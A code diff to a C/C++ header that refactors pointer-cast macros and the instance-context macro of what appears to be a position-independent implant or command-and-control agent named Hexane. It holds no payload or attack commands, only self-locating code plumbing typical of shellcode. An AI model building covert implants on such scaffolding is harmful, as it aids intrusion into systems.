@@ -26,9 +26,9 @@ EXTERN_C LPVOID InstEnd();
 #define WEAK									__attribute__((weak))
 #define FUNCTION								TXT_SECTION(B)
 
-#define C_PTR(x)                                ((LPVOID)(x))
-#define U_PTR(x)                                ((UINT_PTR)(x))
-#define C_DREF(x)                               (*(VOID**)(x))
+#define C_PTR(x)                                (R_CAST(LPVOID, x))
+#define U_PTR(x)                                (R_CAST(UINT_PTR, x))
+#define C_DREF(x)                               (*R_CAST(VOID**, x))
 
 #define C_CAST(T,x)								const_cast<T>(x)
 #define D_CAST(T,x)								dynamic_cast<T>(x)
@@ -475,11 +475,10 @@ typedef struct {
 EXTERN_C WEAK ULONG  __InstanceOffset;
 EXTERN_C WEAK LPVOID __Instance;
 
-#define Ctx 			    __LocalInstance
 #define InstanceOffset()    (U_PTR(&__InstanceOffset))
 #define GLOBAL_OFFSET       (U_PTR(InstStart()) + InstanceOffset())
-#define InstancePtr()	    ((HEXANE_CTX*) C_DREF(C_PTR(GLOBAL_OFFSET)))
-#define HEXANE 		        HEXANE_CTX* __LocalInstance = InstancePtr();
+#define InstancePtr()	    (R_CAST(HEXANE_CTX*, C_DREF(C_PTR(GLOBAL_OFFSET))))
+#define HEXANE 		        HEXANE_CTX* Ctx = InstancePtr();
 
 #define return_defer(x) ntstatus = x; goto defer
 #define InitializeObjectAttributes(ptr, name, attr, root, sec )	\
